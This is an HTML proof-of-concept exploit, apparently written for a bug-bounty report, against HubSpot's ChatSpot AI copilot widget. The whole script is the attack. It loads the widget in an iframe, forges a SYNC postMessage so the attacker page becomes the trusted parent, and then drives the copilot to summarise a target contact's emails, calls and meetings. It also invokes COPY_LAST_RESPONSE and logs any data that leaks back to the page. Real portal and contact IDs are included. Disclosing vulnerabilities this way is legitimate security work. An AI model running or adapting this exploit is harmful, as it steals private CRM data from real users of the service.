<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ChatSpot postMessage Origin Trust Bypass — PoC</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; margin: 0; }
  #log { height: 45vh; overflow-y: auto; padding: 10px; border-bottom: 2px solid #0f0; font-size: 12px; }
  #iframe-container { height: 55vh; position: relative; }
  iframe { width: 100%; height: 100%; border: none; }
  .status  { color: #0ff; }
  .trusted { color: #ff0; }
  .data    { color: #f80; white-space: pre-wrap; word-break: break-all; }
  .error   { color: #f00; }
  .write   { color: #f0f; }
  #controls { position: absolute; top: 10px; right: 10px; z-index: 9999; }
  button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; cursor: pointer; margin: 2px; font-family: monospace; font-size: 11px; }
  button:hover { background: #0f0; color: #000; }
  #status-bar { padding: 4px 10px; background: #1a1a1a; font-size: 11px; border-bottom: 1px solid #333; }
</style>
</head>
<body>

<div id="status-bar">ChatSpot postMessage SYNC Origin Hijack PoC — H1 #3627983 re-report | Portal: <span id="portal-display">146256700</span> | Status: <span id="status-text" class="status">INITIALIZING</span></div>

<div id="log">
  <div class="status">[INIT] PoC loaded. Building iframe...</div>
</div>

<div id="iframe-container">
  <div id="controls">
    <button onclick="testReadSummary()">READ: object_summary</button>
    <button onclick="testReadEngagements()">READ: engagements_summary</button>
    <button onclick="sendCopyLastResponse()">SEND: COPY_LAST_RESPONSE</button>
    <button onclick="clearLog()">CLR LOG</button>
  </div>
</div>

<script>
const PORTAL_ID = '146256700';
const TARGET_CONTACT_ID = '739644991696';   // hhjjjjjhhhh@gmail.com — test contact
const TARGET_TYPE = 'CONTACT';
const HS_IFR = '__hs-ifr';

let iframeEl = null;
let chatspotId = null;
let originTrusted = false;
let msgCount = 0;
let capturedResponses = [];

function log(msg, cls = '') {
  const div = document.getElementById('log');
  const ts = new Date().toISOString().split('T')[1].split('.')[0];
  const el = document.createElement('div');
  if (cls) el.className = cls;
  el.textContent = `[${ts}] ${msg}`;
  div.appendChild(el);
  div.scrollTop = div.scrollHeight;
}

function setStatus(text) {
  document.getElementById('status-text').textContent = text;
}

function clearLog() {
  document.getElementById('log').innerHTML = '';
}

function buildCopilotAction(intent, extra = {}) {
  return encodeURIComponent(JSON.stringify(Object.assign({ intent }, extra)));
}

function loadChatspot(copilotActionJson) {
  const existing = document.getElementById('chatspot-iframe');
  if (existing) existing.remove();
  chatspotId = null;
  originTrusted = false;

  const action = buildCopilotAction('object_engagements_summary', {
    objectId: TARGET_CONTACT_ID,
    objectType: TARGET_TYPE
  });

  const src = `https://app-eu1.hubspot.com/chatspot-widget-ui/${PORTAL_ID}/chat`
    + `?copilotAction=${copilotActionJson || action}`
    + `&hostAppName=attacker-page`
    + `&copilotThreadId=exfil-${Date.now()}`;

  log(`Building iframe: ${src.substring(0, 120)}...`, 'status');

  iframeEl = document.createElement('iframe');
  iframeEl.id = 'chatspot-iframe';
  iframeEl.src = src;
  iframeEl.allow = 'microphone; camera';  // demonstrate permission delegation surface
  iframeEl.style.cssText = 'width:100%;height:100%;border:none;';
  document.getElementById('iframe-container').appendChild(iframeEl);

  iframeEl.addEventListener('load', () => {
    log('Iframe loaded. Sending SYNC to steal origin trust...', 'status');
    sendSync();
  });
}

function sendSync() {
  if (!iframeEl || !iframeEl.contentWindow) {
    log('ERROR: iframe not ready', 'error');
    return;
  }
  const syncMsg = {
    format: HS_IFR,
    from: 'attacker-host',
    to: chatspotId || '*',
    id: `sync-attacker-${Date.now()}`,
    v: 1,
    payload: {
      type: 'SYNC',
      host: window.location.origin,
      embedId: `attacker-${Date.now()}`,
      group: 'attacker-group'
    }
  };
  log('→ Sending SYNC: ' + JSON.stringify(syncMsg).substring(0, 80) + '...', 'status');
  iframeEl.contentWindow.postMessage(syncMsg, '*');
}

function sendHsIfrMessage(type, payload = {}) {
  if (!iframeEl || !iframeEl.contentWindow) { log('iframe not ready', 'error'); return; }
  if (!originTrusted) { log('Origin not yet trusted — send SYNC first', 'error'); return; }
  const msg = {
    format: HS_IFR,
    from: 'attacker-host',
    to: chatspotId || '*',
    id: `msg-${type}-${Date.now()}`,
    v: 1,
    payload: Object.assign({ type }, payload)
  };
  log('→ Sending ' + type + ': ' + JSON.stringify(payload).substring(0, 60), 'write');
  iframeEl.contentWindow.postMessage(msg, '*');
}

function testReadSummary() {
  const action = buildCopilotAction('object_summary', {
    objectId: TARGET_CONTACT_ID,
    objectTypeId: '0-1',
    objectTypeLabel: 'Contact',
    summaryType: 'DEFAULT'
  });
  log('--- Reloading with intent: object_summary ---', 'status');
  loadChatspot(action);
}

function testReadEngagements() {
  const action = buildCopilotAction('object_engagements_summary', {
    objectId: TARGET_CONTACT_ID,
    objectType: TARGET_TYPE
  });
  log('--- Reloading with intent: object_engagements_summary ---', 'status');
  loadChatspot(action);
}

function sendCopyLastResponse() {
  // Try to get the AI response text sent back to us
  sendHsIfrMessage('INVOKE_CAPABILITY', {
    type: 'INVOKE_CAPABILITY',
    name: 'COPY_LAST_RESPONSE',
    source: 'attacker',
    args: {}
  });
}

// Main message listener
window.addEventListener('message', e => {
  if (!e.data) return;

  // Handle __hs-ifr protocol messages
  if (e.data && e.data.format === HS_IFR) {
    msgCount++;
    const payload = e.data.payload || {};
    const msgType = payload.type || e.data.type || '(unknown)';

    log(`← [#${msgCount}] ${msgType} from ${e.origin}`, 'status');

    if (payload.chatspotId || e.data.id) {
      const id = payload.chatspotId || e.data.from || e.data.id;
      if (id && !chatspotId) {
        chatspotId = id;
        log(`  chatspotId captured: ${chatspotId}`, 'status');
      }
    }

    if (msgType === 'SYNC_ACK' || msgType === 'SYNC-ACK') {
      originTrusted = true;
      setStatus('SYNC HIJACKED ✓');
      log('*** ORIGIN TRUST ESTABLISHED — attacker is now trusted parent ***', 'trusted');
      log(`  Widget believes its parent is: ${window.location.origin}`, 'trusted');
    }

    if (msgType === 'READY') {
      log('Widget READY — copilotAction being processed by AI...', 'trusted');
    }

    // Capture any response data that leaks to us
    const raw = JSON.stringify(e.data, null, 2);
    if (raw.length > 100) {
      capturedResponses.push({ ts: Date.now(), origin: e.origin, data: e.data });
      log(`  DATA (${raw.length} bytes): ${raw.substring(0, 200)}...`, 'data');
    }
    return;
  }

  // Non-hs-ifr messages (could be copilot response events leaking out)
  const raw = JSON.stringify(e.data);
  if (raw.length > 20 && !raw.includes('webpack') && !raw.includes('contentscript')) {
    log(`← NON-IFR msg from ${e.origin}: ${raw.substring(0, 150)}`, 'data');
    capturedResponses.push({ ts: Date.now(), origin: e.origin, data: e.data });
  }
});

// Auto-start with object_engagements_summary
document.addEventListener('DOMContentLoaded', () => {
  log(`Target portal: ${PORTAL_ID}`, 'status');
  log(`Target contact: ${TARGET_CONTACT_ID} (${TARGET_TYPE})`, 'status');
  log('Attack: first-message-wins SYNC origin trust bypass', 'status');
  log('Payload: object_engagements_summary (reads all emails/calls/meetings)', 'status');
  log('', '');
  loadChatspot();
});
</script>
</body>
</html>
